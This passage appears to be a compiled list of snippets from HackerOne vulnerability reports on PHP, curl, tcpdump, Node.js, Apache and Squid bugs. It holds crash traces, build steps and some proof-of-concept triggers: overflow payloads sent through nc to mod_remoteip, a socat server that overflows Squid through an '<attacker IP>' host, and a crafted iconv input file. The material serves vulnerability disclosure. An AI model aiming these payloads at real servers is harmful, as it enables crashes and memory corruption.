b7480000-b7481000 rw-p 0001b000 08:01 787579     /lib/i386-linux-gnu/libgcc_s.so.1
# … truncated …
```

## 57. [#248659](https://hackerone.com/reports/248659)  -  PHP WDDX Deserialization Heap OOB Read in timelib_meridian()
*medium, $500*

```
../../php7_wddx/bin/php
```

## 58. [#965914](https://hackerone.com/reports/965914)  -  `fs.realpath.native` on darwin may cause buffer overflow
*medium*

```
${LONG_PATH}
```

## 59. [#965914](https://hackerone.com/reports/965914)  -  `fs.realpath.native` on darwin may cause buffer overflow
*medium*

```
${SHORT_LINK}
```

## 60. [#174069](https://hackerone.com/reports/174069)  -  Buffer overflow in HTTP parse_hostinfo(), parse_userinfo() and parse_scheme()
*medium*

```bash
$ ./configure --enable-raphf --enable-propro --with-http && make
$ gdb ./sapi/cli/php
gdb> r http_message_parse.php
[...]
Fatal error: Uncaught http\Exception\BadMessageException: http\Message::__construct(): Could not parse HTTP protocol version 'HTTP/1.rdrd-vvv5:##HT
[...] // garbled output
85:#~t? HTT in http_message_parse.php on line 7

Program received signal SIGSEGV, Segmentation fault.
0x00000000006d6ef3 in _php_stream_free (stream=<optimized out>, close_options=11)
    at /home/rc0r/tmp/php-src/main/streams/streams.c:467
467			ret = stream->ops->close(stream, preserve_handle ? 0 : 1);
gdb> i r
rax            0x4142434445464748	4702394921427289928
rbx            0xb	11
rcx            0x1	1
rdx            0x0	0
rsi            0x1	1
rdi            0x7ffff42ad300	140737289835264
rbp            0x7ffff42ad300	0x7ffff42ad300
rsp            0x7fffffffb150	0x7fffffffb150
r8             0x0	0
r9             0x1	1
r10            0x3d3	979
r11            0x7ffff58ad760	140737312905056
r12            0x0	0
r13            0x1	1
r14            0x0	0
r15            0x0	0
rip            0x6d6ef3	0x6d6ef3 <_php_stream_free+307>
eflags         0x10202	[ IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
# … truncated …
```

## 61. [#320269](https://hackerone.com/reports/320269)  -  `npmconf` (and `npm` js api) allocate and write to disk uninitialized memory content when a typed number is passed as input on Node.js 4.x
*high*

```js
var URI = "https://registry.example.com:8661/";
require('npmconf').load({}, function (err, conf) {
  conf.setCredentialsByURI(URI, {username: 'foo', email: 'boo@example.com', password: 200});
  console.log(conf.getCredentialsByURI(URI)); // This just outputs the setting
  // conf.save('user', function() {}) // Warning: writes base64-encoded uninitialized buffer .npmrc
});
```

## 62. [#320269](https://hackerone.com/reports/320269)  -  `npmconf` (and `npm` js api) allocate and write to disk uninitialized memory content when a typed number is passed as input on Node.js 4.x
*high*

```js
var URI = "https://registry.example.com:8661/";
require('npm').load({}, function (err, npm) {
  npm.config.setCredentialsByURI(URI, {username: 'foo', email: 'boo@example.com', password: 200});
  console.log(npm.config.getCredentialsByURI(URI)); // This just outputs the setting
  // npm.config.save('user', function() {}) // Warning: writes base64-encoded uninitialized buffer .npmrc
});
```

## 63. [#175315](https://hackerone.com/reports/175315)  -  Illegal write access through Locale methods
*low, $500*

```
PHP_FUNCTION(locale_get_all_variants)
{
	const char*  	loc_name        = NULL;
	size_t    		loc_name_len    = 0;

	int	result		= 0;
	char*	token		= NULL;
	zend_string*	variant		= NULL;
	char*	saved_ptr	= NULL;

	intl_error_reset( NULL );

	if(zend_parse_parameters( ZEND_NUM_ARGS(), "s",
	&loc_name, &loc_name_len ) == FAILURE)
	{
		intl_error_set( NULL, U_ILLEGAL_ARGUMENT_ERROR,
	     "locale_parse: unable to parse input params", 0 );

		RETURN_FALSE;
	}

	if(loc_name_len == 0) {
		loc_name = intl_locale_get_default();
	}

        // Here check that loc_name_len is not greater than 0xffffffff

	array_init( return_value );

	/* If the locale is grandfathered, stop, no variants */
	if( findOffset( LOC_GRANDFATHERED , loc_name ) >=  0 ){
		/* ("Grandfathered Tag. No variants."); */
	}
	else {
	/* Call ICU variant */
		variant = get_icu_value_internal( loc_name , LOC_VARIANT_TAG , &result ,0);
```

## 64. [#2629968](https://hackerone.com/reports/2629968)  -  CVE-2024-7264: ASN.1 date parser overread
*low*

```
../../lib/mprintf.c:883:15
```

## 65. [#2629968](https://hackerone.com/reports/2629968)  -  CVE-2024-7264: ASN.1 date parser overread
*low*

```
../../lib/mprintf.c:1105:9
```

## 66. [#2629968](https://hackerone.com/reports/2629968)  -  CVE-2024-7264: ASN.1 date parser overread
*low*

```
../../lib/dynbuf.c:198:8
```

## 67. [#2629968](https://hackerone.com/reports/2629968)  -  CVE-2024-7264: ASN.1 date parser overread
*low*

```
../../lib/dynbuf.c:231:12
```

## 68. [#2629968](https://hackerone.com/reports/2629968)  -  CVE-2024-7264: ASN.1 date parser overread
*low*

```
../../lib/vtls/x509asn1.c:542:10
```

## 69. [#2629968](https://hackerone.com/reports/2629968)  -  CVE-2024-7264: ASN.1 date parser overread
*low*

```
../../lib/vtls/x509asn1.c:632:14
```

## 70. [#2629968](https://hackerone.com/reports/2629968)  -  CVE-2024-7264: ASN.1 date parser overread
*low*

```
../../lib/vtls/x509asn1.c:1185:12
```

## 71. [#482200](https://hackerone.com/reports/482200)  -  puttygen: heap-buffer-overflow in mp_get_decimal()
*low*

```
../../putty-0.70-2019-01-17.53747ad/tmp/out/crashes/test0013.ppk
```

## 72. [#3749204](https://hackerone.com/reports/3749204)  -  CVE-2026-9080: UAF after pause in socket callback
*low*

```c
/*
 * poc_uaf.c
 *
 * Trigger: call curl_easy_pause(easy, CURLPAUSE_RECV) from inside
 * CURLMOPT_SOCKETFUNCTION.  When the socket transitions from POLL_OUT to
 * POLL_IN (request sent, response pending), pausing recv empties the
 * transfer's poll-set, causing mev_forget_socket() to free the mev_sh_entry
 * that mev_sh_entry_update() is still about to write to.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <curl/curl.h>

static int g_server_port;

static void *server_thread(void *arg)
{
  int lfd = *(int *)arg;
  char buf[4096];
  for(;;) {
    int cfd = accept(lfd, NULL, NULL);
    if(cfd < 0)
      break;
    (void)recv(cfd, buf, sizeof(buf), 0);
    const char *resp =
      "HTTP/1.1 200 OK\r\n"
      "Content-Length: 512\r\n"
      "Connection: close\r\n"
      "\r\n";
    (void)send(cfd, resp, strlen(resp), 0);
    memset(buf, 'X', 512);
    (void)send(cfd, buf, 512, 0);
    close(cfd);
# … truncated …
```

## 73. [#3754343](https://hackerone.com/reports/3754343)  -  CVE-2026-9546: sending old referer
*low*

```
${ROOT:-$PWD}
```

## 74. [#3754343](https://hackerone.com/reports/3754343)  -  CVE-2026-9546: sending old referer
*low*

```
${TMPDIR:-/tmp}
```

## 75. [#3754343](https://hackerone.com/reports/3754343)  -  CVE-2026-9546: sending old referer
*low*

```
${KEEP_WORKDIR:-0}
```

## 76. [#3754343](https://hackerone.com/reports/3754343)  -  CVE-2026-9546: sending old referer
*low*

```
${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}
```

## 77. [#584757](https://hackerone.com/reports/584757)  -  Null Pointer Dereference in phar_create_or_parse_filename
*low*

```
../../php-7.1.25/sapi/cli/php
```

## 78. [#248659](https://hackerone.com/reports/248659)  -  PHP WDDX Deserialization Heap OOB Read in timelib_meridian()
*medium, $500*

```
CC="`which gcc`" CFLAGS="-O0 -g -fsanitize=address" ./configure --prefix="`pwd`/../php7_wddx" --disable-shared --enable-wddx
```

## 79. [#3702072](https://hackerone.com/reports/3702072)  -  bedrock-mantle.api.aws accepts Bedrock API keys outside the IAM Deny, CloudTrail signal, and invocation logging AWS publishes for Bedrock keys
*medium*

```
22:42:36Z  AWSLogs/.../BedrockModelInvocationLogs/.../22/<file>.json.gz delivered
           inputBodyJson.messages[0].content == "vdp-paired-test-1777329695 reply OK"   # bedrock prompt
           grep across every file delivered for the day for the same marker             # mantle: 0 hits
```

## 80. [#1269242](https://hackerone.com/reports/1269242)  -  CVE-2021-22945: UAF and double-free in MQTT sending
*medium*

```
free(): double free detected in tcache 2
[1]    199104 abort (core dumped)  ./curl mqtt://127.0.0.1:5678
```

## 81. [#674540](https://hackerone.com/reports/674540)  -  mod_remoteip stack buffer overflow and NULL pointer dereference
*medium*

```
printf "PROXY aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\r\n" | nc localhost 6666
```

## 82. [#674540](https://hackerone.com/reports/674540)  -  mod_remoteip stack buffer overflow and NULL pointer dereference
*medium*

```
printf "\x0D\x0A\x0D\x0A\x00\x0D\x0A\x51\x55\x49\x54\x0A\x21\x32\x08\x6f\x6faaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" | nc localhost 6666
```

## 83. [#674540](https://hackerone.com/reports/674540)  -  mod_remoteip stack buffer overflow and NULL pointer dereference
*medium*

```
printf "PROXY aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\r\n" | nc localhost 6666
```

## 84. [#674540](https://hackerone.com/reports/674540)  -  mod_remoteip stack buffer overflow and NULL pointer dereference
*medium*

```
printf "\x0D\x0A\x0D\x0A\x00\x0D\x0A\x51\x55\x49\x54\x0A\x20\x11\x00\x00" | nc localhost 6666
```

## 85. [#674540](https://hackerone.com/reports/674540)  -  mod_remoteip stack buffer overflow and NULL pointer dereference
*medium*

```
printf "\x0D\x0A\x0D\x0A\x00\x0D\x0A\x51\x55\x49\x54\x0A\x21\x00\x00\x00" | nc localhost 6666
```

## 86. [#3735193](https://hackerone.com/reports/3735193)  -  CVE-2026-8925: SASL double-free
*medium*

```bash
gcc -shared -fPIC -o gsasl_shim.so gsasl_shim.c $(pkg-config --cflags gsasl)
LD_PRELOAD=./gsasl_shim.so ASAN_OPTIONS=detect_leaks=0 \
    ./src/curl -v imaps://user:pass@mail.example.com/
```

## 87. [#3735193](https://hackerone.com/reports/3735193)  -  CVE-2026-8925: SASL double-free
*medium*

```c
#include <curl/curl.h>

int main(void)
{
  CURL *easy;
  curl_global_init(CURL_GLOBAL_DEFAULT);
  easy = curl_easy_init();
  curl_easy_setopt(easy, CURLOPT_URL,      "smtps://mail.example.com/");
  curl_easy_setopt(easy, CURLOPT_USERNAME, "user@example.com");
  curl_easy_setopt(easy, CURLOPT_PASSWORD, "hunter2");
  curl_easy_perform(easy);   /* sasl_choose_gsasl() -> failed probe */
  curl_easy_cleanup(easy);   /* gsasl_conn_dtor() -> double-free */
  curl_global_cleanup();
  return 0;
}
```

## 88. [#798744](https://hackerone.com/reports/798744)  -  Null Pointer Dereference in PHP Session Upload Progress
*medium*

```
$php poc.php
```

## 89. [#1178337](https://hackerone.com/reports/1178337)  -  Improper handling of untypical characters in domain names
*high*

```
const dns = require('dns');

if (process.argv[2] == "-x") {
	var host = process.argv[3];

	dns.reverse(host, (err, result) => {
		
		if (result){
			for (var i = 0; i < result.length; i++)
			{
				console.log("node".padEnd(8), "reverse".padEnd(16), host.padEnd(30), "-".padEnd(80), "-".padEnd(10), "IN".padEnd(5), "PTR".padEnd(5), result[i]);
			}
		} else {
			console.log("node".padEnd(8), "reverse".padEnd(16), host.padEnd(30), "-".padEnd(80), "-".padEnd(10), "-".padEnd(5), "ERROR".padEnd(5), err.errno);
		}
	});
	
} else {
	var host = process.argv[2];
	dns.lookup(host, (err, result) => {
		if (result) {
			console.log("node".padEnd(8), "lookup".padEnd(16), host.padEnd(30), "-".padEnd(80), "-".padEnd(10), "IN".padEnd(5), "A".padEnd(5), result);
		} else {
			console.log("node".padEnd(8), "lookup".padEnd(16), host.padEnd(30), "-".padEnd(80), "-".padEnd(10), "-".padEnd(5), "ERROR".padEnd(5), err.errno);
		}
	});
	
	dns.resolve(host, (err, result) => {
		if (result) {
			for (var i = 0; i < result.length; i++) {
				console.log("node".padEnd(8), "resolve".padEnd(16), host.padEnd(30), "-".padEnd(80), "-".padEnd(10), "IN".padEnd(5), "A".padEnd(5), result[i]);
			}
		} else {
			console.log("node".padEnd(8), "resolve".padEnd(16), host.padEnd(30), "-".padEnd(80), "-".padEnd(10), "-".padEnd(5), "ERROR".padEnd(5), err.errno);
		}
# … truncated …
```

## 90. [#824771](https://hackerone.com/reports/824771)  -  UrnState Heap Overflow
*critical*

```bash
$ socat TCP-LISTEN:8080,fork SYSTEM:"python -c \'print\(\\\"A\\\" * 4096)\'"
```

## 91. [#824771](https://hackerone.com/reports/824771)  -  UrnState Heap Overflow
*critical*

```bash
$ echo -e "GET urn::@<attacker IP>:8080/ HTTP/1.1\r\n\r\n" |nc <squid hostname> 3128
```

## 92. [#178144](https://hackerone.com/reports/178144)  -  imagecropauto out-of-bounds access
*low, $500*

```
https://github.com/php/php-src/blob/master/ext/gd/gd.c#L4591


PHP_FUNCTION(imagecropauto)
{
...
		case GD_CROP_THRESHOLD:
			if (color < 0) {
				php_error_docref(NULL, E_WARNING, "Color argument missing with threshold mode");
				RETURN_FALSE;
			}
			im_crop = gdImageCropThreshold(im, color, (float) threshold);
			break;
...
```

## 93. [#3294999](https://hackerone.com/reports/3294999)  -  CVE-2025-9086: Out of bounds read for cookie path
*low*

```shell
git clone https://github.com/curl/curl
cd curl
export CC=clang
export CXX=clang++
export CFLAGS="-fsanitize=address"
export CXXFLAGS="-fsanitize=address"
export LDFLAGS="-fsanitize=address"

./configure --with-openssl --disable-shared --enable-debug --enable-maintainer-mode
make -j$(nproc)
```

## 94. [#3294999](https://hackerone.com/reports/3294999)  -  CVE-2025-9086: Out of bounds read for cookie path
*low*

```shell
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 1 -nodes -subj "/C=XX/ST=StateName/L=CityName/O=CompanyName/OU=CompanySectionName/CN=CommonNameOrHostname"
python3 server.py
```

## 95. [#3294999](https://hackerone.com/reports/3294999)  -  CVE-2025-9086: Out of bounds read for cookie path
*low*

```shell
./src/curl --insecure -c cookies -vv -L https://$(hostname):9443
```

## 96. [#2604391](https://hackerone.com/reports/2604391)  -  CVE-2024-6874: macidn punycode buffer overread
*low*

```
==77491==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7e649e109750 at pc 0x5852e492c7b5 bp 0x7ffec1daa250 sp 0x7ffec1da9a10
READ of size 257 at 0x7e649e109750 thread T0
    #0 0x5852e492c7b4 in strlen.part.0 asan_interceptors.cpp.o
    #1 0x5852e4a1bf48 in curl_dbg_strdup curl/lib/memdebug.c:198:9
    #2 0x5852e4a43e13 in mac_idn_to_ascii curl/lib/idn.c:75:14
    #3 0x5852e4a4331f in idn_decode curl/lib/idn.c:244:12
    #4 0x5852e4a43158 in Curl_idn_decode curl/lib/idn.c:274:21
    #5 0x5852e4a28c6b in curl_url_get curl/lib/urlapi.c:1582:29
    #6 0x5852e4a196ec in main dummy.c:6:4
```

## 97. [#2956023](https://hackerone.com/reports/2956023)  -  CVE-2025-0725: gzip integer overflow
*low*

```c
#include <curl/curl.h>

int main (void) {
    CURL *curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:1234/");
    curl_easy_setopt(curl, CURLOPT_ACCEPT_ENCODING, "gzip");
    curl_easy_setopt(curl, CURLOPT_BUFFERSIZE, 10485760); // to speed up the PoC
    curl_easy_perform(curl);
}
```

## 98. [#232150](https://hackerone.com/reports/232150)  -  heap-buffer-overflow (READ of size 11) in Perl 5.25.x
*low*

```
perl -e 'v300&O|0' triggers a heap-buffer-overflow in Perl_my_atof2 (numeric.c:1349). This was found with AFL, ASAN and libdislocator.so and affects v5.25.4 (v5.25.3-305-g8c6b0c7). Perl 5.20.2 returns errors, doesn't crash.

==23567==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200000e1ba at pc 0x0000004abd02 bp 0x7ffced70a210 sp 0x7ffced7099d0
READ of size 11 at 0x60200000e1ba thread T0
    #0 0x4abd01 in __interceptor_strlen (/root/perl/perl+0x4abd01)
    #1 0xc2edf7 in Perl_my_atof2 /root/perl/numeric.c:1349:28
    #2 0xc2e7a5 in Perl_my_atof /root/perl/numeric.c:1244:13
    #3 0x99bbfc in S_sv_setnv /root/perl/sv.c:2113:9
    #4 0x8fd5fe in S_sv_2iuv_common /root/perl/sv.c:2298:13
    #5 0x900fd5 in Perl_sv_2uv_flags /root/perl/sv.c:2574:6
    #6 0x9c7738 in Perl_pp_bit_or /root/perl/pp.c:2463:35
    #7 0x7f1d93 in Perl_runops_debug /root/perl/dump.c:2234:23
    #8 0x5a11d6 in S_run_body /root/perl/perl.c:2524:2
    #9 0x5a11d6 in perl_run /root/perl/perl.c:2447
    #10 0x4de85d in main /root/perl/perlmain.c:123:9
    #11 0x7ff026dedb44 in __libc_start_main /build/glibc-uPj9cH/glibc-2.19/csu/libc-start.c:287
    #12 0x4de4cc in _start (/root/perl/perl+0x4de4cc)

0x60200000e1ba is located 0 bytes to the right of 10-byte region [0x60200000e1b0,0x60200000e1ba)
allocated by thread T0 here:
    #0 0x4c0e4b in malloc (/root/perl/perl+0x4c0e4b)
    #1 0x7f5bd7 in Perl_safesysmalloc /root/perl/util.c:153:21
# … truncated …
```

## 99. [#3751697](https://hackerone.com/reports/3751697)  -  CVE-2026-10536: HTTP/2 stream-dependency tree UAF
*low*

```sh
autoreconf -fi
mkdir build && cd build
CFLAGS='-O1 -g -fsanitize=address' LDFLAGS='-fsanitize=address' CC=clang \
  ../configure --with-openssl --enable-debug --enable-maintainer-mode --disable-shared
make -j
```

## 100. [#3751697](https://hackerone.com/reports/3751697)  -  CVE-2026-10536: HTTP/2 stream-dependency tree UAF
*low*

```c
#include <curl/curl.h>
int main(void) {
    curl_global_init(CURL_GLOBAL_DEFAULT);
    CURL *A = curl_easy_init();
    CURL *B = curl_easy_init();
    curl_easy_setopt(B, CURLOPT_STREAM_DEPENDS, A);
    curl_easy_reset(B);
    curl_easy_cleanup(B);
    curl_easy_cleanup(A);
    curl_global_cleanup();
    return 0;
}
```

## 101. [#3751697](https://hackerone.com/reports/3751697)  -  CVE-2026-10536: HTTP/2 stream-dependency tree UAF
*low*

```sh
clang -fsanitize=address -g -I../include poc.c \
  ./lib/.libs/libcurl.a -lssl -lcrypto -lz -lnghttp2 -lidn2 -lzstd \
  -lbrotlidec -lldap -llber -o poc
./poc
```

## 102. [#3749204](https://hackerone.com/reports/3749204)  -  CVE-2026-9080: UAF after pause in socket callback
*low*

```diff
--- a/lib/multi_ev.c
+++ b/lib/multi_ev.c
@@ -271,9 +271,14 @@ static CURLMcode mev_sh_entry_update(...)
   mev_in_callback(multi, TRUE);
   rc = multi->socket_cb(data, s, comboaction, multi->socket_userp,
                         entry->user_data);
   mev_in_callback(multi, FALSE);
-  entry->announced = TRUE;
   if(rc == -1) {
     multi->dead = TRUE;
     return CURLM_ABORTED_BY_CALLBACK;
   }
+  /* curl_easy_pause() is documented as callable from any callback; it
+   * re-enters mev_assess() which may free this entry. Re-fetch. */
+  entry = mev_sh_entry_get(&multi->ev.sh_entries, s);
+  if(!entry)
+    return CURLM_OK;
+  entry->announced = TRUE;
   entry->action = (unsigned int)comboaction;
   return CURLM_OK;
```

## 103. [#180562](https://hackerone.com/reports/180562)  -  Memory corruption in _php_math_number_format_ex()
*low*

```
Open php program in gdb, set a breakpoint at line *1149* in file
```

## 104. [#180582](https://hackerone.com/reports/180582)  -  Heap overflow due to integer overflow in php_escape_html_entities_ex() function
*low*

```
Actual result:
--------------
Open php program in gdb and run test script, set a breakpoint at line in file `ext/standard/html.c:1269`.
When debugger stops, we have `oldlen=0x7fffffff`. Because `oldlen` is bigger than 0x64, `maxlen` is equal to twice `oldlen`. `maxlen` is equal to 0xfffffffe.
```

## 105. [#180584](https://hackerone.com/reports/180584)  -  Heap overflow due to integer overflow in pg_escape_string() function
*low*

```
Actual result:
--------------
Open php program in gdb and run test script, set a breakpoint at line in file `ext/pgsql/pgsql.c:4384`.
When debugger stops, we have the length of `from` string is 0x7fffffff. The size which is used as parameter in `_emalloc()` function is equal to `((0x7fffffff * 2 + 0x14 ) & 0xfffffffc)`. Due to integer overflow, new size is 0x10. The new memory region is too small to store a large string!
```

## 106. [#593229](https://hackerone.com/reports/593229)  -  Out-of-bounds read in iconv.c:_php_iconv_mime_decode() due to integer overflow
*high, $1,500*

```bash
$ echo "53754c743b2020304a70616100000d0d0d0d0d0d0d0d0d6563743a203d3f69730d0d0d0d0d0d0d0d0d0d0d0d0d0d0d6563743a203d3f6973754c743b2020304a70616100000d0d0d0d0d0d0d0d0d6563743a203d3f6f2d383835392d313f713f3c334633463d33463f3da2" | xxd -r -p - > poc

$ sha256sum poc
c471fb3e1511897d3fda9095e0eb85c934532a207f30ac99f0e7d58c42916e4b  poc

$ USE_ZEND_ALLOC=0 sapi/cli/php -r '$hdr = iconv_mime_decode_headers(file_get_contents("poc"),2);'
=================================================================
==26444==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60d0000005a8 at pc 0x000000a2ee39 bp 0x7ffcc313a470 sp 0x7ffcc313a460
READ of size 1 at 0x60d0000005a8 thread T0
    #0 0xa2ee38 in _php_iconv_mime_decode /home/neural.x/Projects/php-7.3.5/ext/iconv/iconv.c:1965
    #1 0xa332c6 in zif_iconv_mime_decode_headers /home/neural.x/Projects/php-7.3.5/ext/iconv/iconv.c:2409
    #2 0x159adb7 in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER /home/neural.x/Projects/php-7.3.5/Zend/zend_vm_execute.h:690
...
```

## 107. [#964583](https://hackerone.com/reports/964583)  -  CVE-2017-13041 The ICMPv6 parser in tcpdump before 4.9.2 has a buffer over-read in print-icmp6.c:icmp6_nodeinfo_print().
*high, $500*

```http
Patch: https://github.com/the-tcpdump-group/tcpdump/commit/f4b9e24c7384d882a7f434cc7413925bf871d63e

This vulnerability can be exploited in two ways. The first is to produce a .pcap file with crafted packet(s) for the protocol(s) concerned and make the target system try to decode the file using tcpdump. The second is to send specially crafted packet(s) to the network segment where the target system is running a tcpdump process that is decoding a live packet capture. In the latter case it depends
```

## 108. [#964582](https://hackerone.com/reports/964582)  -  CVE-2017-13040 The MPTCP parser in tcpdump before 4.9.2 has a buffer over-read in print-mptcp.c, several functions.
*high, $500*

```http
Patch: https://github.com/the-tcpdump-group/tcpdump/commit/4c3aee4bb0294c232d56b6d34e9eeb74f630fe8c

This vulnerability can be exploited in two ways. The first is to produce a .pcap file with crafted packet(s) for the protocol(s) concerned and make the target system try to decode the file using tcpdump. The second is to send specially crafted packet(s) to the network segment where the target system is running a tcpdump process that is decoding a live packet capture. In the latter case it depends
```

## 109. [#268805](https://hackerone.com/reports/268805)  -  CVE-2017-13008 The IEEE 802.11 parser in tcpdump before 4.9.2 has a buffer over-read in print-802_11.c:parse_elements().
*high*

```http
Patch: https://github.com/the-tcpdump-group/tcpdump/commit/5edf405d7ed9fc92f4f43e8a3d44baa4c6387562

`The IEEE 802.11 parser in tcpdump before 4.9.2 has a buffer over-read in print-802_11.c:parse_elements().`
```

## 110. [#268804](https://hackerone.com/reports/268804)  -  CVE-2017-12986 The IPv6 routing header parser in tcpdump before 4.9.2 has a buffer over-read in print-rt6.c:rt6_print().
*high*

```http
Patch: https://github.com/the-tcpdump-group/tcpdump/commit/7ac73d6cd41e9d4ac0ca7e6830ca390e195bb21c

`The IPv6 routing header parser in tcpdump before 4.9.2 has a buffer over-read in print-rt6.c:rt6_print().`
```

## 111. [#247028](https://hackerone.com/reports/247028)  -  CVE-2017-10966: Heap-use-after-free in Irssi <1.0.4
*high*

```http
Patch:
https://github.com/irssi/irssi/commit/5e26325317c72a04c1610ad952974e206

'''
```

## 112. [#1178337](https://hackerone.com/reports/1178337)  -  Improper handling of untypical characters in domain names
*high*

```bash
$ dig dig cnamezeroweb.test.xdi-attack.net

cnamezeroweb.test.xdi-attack.net. 284 IN CNAME  zero.longtxtrecord.ml\000cnamezeroweb.test.xdi-attack.net.
zero.longtxtrecord.ml\000cnamezeroweb.test.xdi-attack.net. 284 IN A 1.2.3.4

$ dig cnamezeroweb.test.xdi-attack.net

cnamezeroweb.test.xdi-attack.net. 300 IN CNAME  zero.longtxtrecord.ml\000cnamezeroweb.test.xdi-attack.net.
zero.longtxtrecord.ml\000cnamezeroweb.test.xdi-attack.net. 299 IN A 1.2.3.4

$ getent hosts cnamezeroweb.test.xdi-attack.net
$ getent hosts cnamexss.test.xdi-attack.net

(no output, return code = 2 because name is filtered)
```

## 113. [#268806](https://hackerone.com/reports/268806)  -  CVE-2017-13009 The IPv6 mobility parser in tcpdump before 4.9.2 has a buffer over-read in print-mobility.c:mobility_print().
*high*

```http
Patch: https://github.com/the-tcpdump-group/tcpdump/commit/db8c799f6dfc68765c9451fcbfca06e662f5bd5f

`The IPv6 mobility parser in tcpdump before 4.9.2 has a buffer over-read in print-mobility.c:mobility_print().`
```

## 114. [#268807](https://hackerone.com/reports/268807)  -  CVE-2017-13010 The BEEP parser in tcpdump before 4.9.2 has a buffer over-read in print-beep.c:l_strnstart().
*high*

```http
Patch: https://github.com/the-tcpdump-group/tcpdump/commit/877b66b398518d9501513e0860c9f3a8acc70892

`The BEEP parser in tcpdump before 4.9.2 has a buffer over-read in print-beep.c:l_strnstart().`
```

## 115. [#802863](https://hackerone.com/reports/802863)  -  CVE-2017-13050: The RPKI-Router parser in tcpdump before 4.9.2 has a buffer over-read in print-rpki-rtr.c:rpki_rtr_pdu_print()
*high*

```bash
$ git clone -b 289c672020280529fd382f3502efab7100d638ec https://github.com/the-tcpdump-group/tcpdump
```

## 116. [#802863](https://hackerone.com/reports/802863)  -  CVE-2017-13050: The RPKI-Router parser in tcpdump before 4.9.2 has a buffer over-read in print-rpki-rtr.c:rpki_rtr_pdu_print()
*high*

```bash
$ CC=afl-gcc
$ AFL_USE_ASAN=1 make -j
```

## 117. [#1047086](https://hackerone.com/reports/1047086)  -  Heap buffer overflow vulnerability while processing a malformed TIFF file.
*high*

```bash
$ magick -version
Version: ImageMagick 7.0.10-45 Q16 x86_64 2020-11-30 https://imagemagick.org
Copyright: © 1999-2020 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5)
Delegates (built-in): freetype jbig jng jpeg lcms lzma png raw tiff webp x zlib
```

## 118. [#268808](https://hackerone.com/reports/268808)  -  CVE-2017-13038 The PPP parser in tcpdump before 4.9.2 has a buffer over-read in print-ppp.c:handle_mlppp().
*high*

```http
Patch: https://github.com/the-tcpdump-group/tcpdump/commit/7335163a6ef82d46ff18f3e6099a157747241629

`The PPP parser in tcpdump before 4.9.2 has a buffer over-read in print-ppp.c:handle_mlppp().`
```

## 119. [#227344](https://hackerone.com/reports/227344)  -  CVE-2017-8798 - miniupnp getHTTPResponse chunked encoding integer signedness error
*high*

```
client (miniupnpc)                         server (poc.py)
          |                                         |
          |                                         |
          | SSDP:  Discovery - M-SEARCH             |
      1.  | --------------------------------------> |
          |                                         |
          | SSDP:  Reply - Location Header          |
      2.  | <-------------------------------------- |
          |                                         |
          | SCPD:  GET (Location Header/xxxx.xml)   |
      3.  | --------------------------------------> |
          |                                         |
          | SCPD:  HTTP chunked-encoded reply       |
      4.  | <-------------------------------------- |
          |                                         |
```

## 120. [#268803](https://hackerone.com/reports/268803)  -  CVE-2017-12985: The IPv6 parser in tcpdump before 4.9.2 has a buffer over-read in ip6_print()
*high*

```http
Patch: https://github.com/the-tcpdump-group/tcpdump/commit/66df248b49095c261138b5a5e34d341a6bf9ac7f

`The IPv6 parser in tcpdump before 4.9.2 has a buffer over-read in print-ip6.c.`
```

## 121. [#802896](https://hackerone.com/reports/802896)  -  CVE-2017-13019:  The PGM parser in tcpdump before 4.9.2 has a buffer over-read in print-pgm.c:pgm_print()
*high*

```bash
$ git clone -b 26a6799b9ca80508c05cac7a9a3bef922991520b https://github.com/the-tcpdump-group/tcpdump
```

## 122. [#3294999](https://hackerone.com/reports/3294999)  -  CVE-2025-9086: Out of bounds read for cookie path
*low*

```c
static int
replace_existing(struct Curl_easy *data,
                 struct Cookie *co,
                 struct CookieInfo *ci,
                 bool secure,
                 bool *replacep)
{
  bool replace_old = FALSE;
  struct Curl_llist_node *replace_n = NULL;
  struct Curl_llist_node *n;
  size_t myhash = cookiehash(co->domain);
  for(n = Curl_llist_head(&ci->cookielist[myhash]); n; n = Curl_node_next(n)) {
    struct Cookie *clist = Curl_node_elem(n);
    if(!strcmp(clist->name, co->name)) {
      /* the names are identical */
      bool matching_domains = FALSE;

      if(clist->domain && co->domain) {
        if(curl_strequal(clist->domain, co->domain))
          /* The domains are identical */
          matching_domains = TRUE;
      }
      else if(!clist->domain && !co->domain)
        matching_domains = TRUE;

      if(matching_domains && /* the domains were identical */
         clist->spath && co->spath && /* both have paths */
         clist->secure && !co->secure && !secure) {
        size_t cllen;
        const char *sep;

        /*
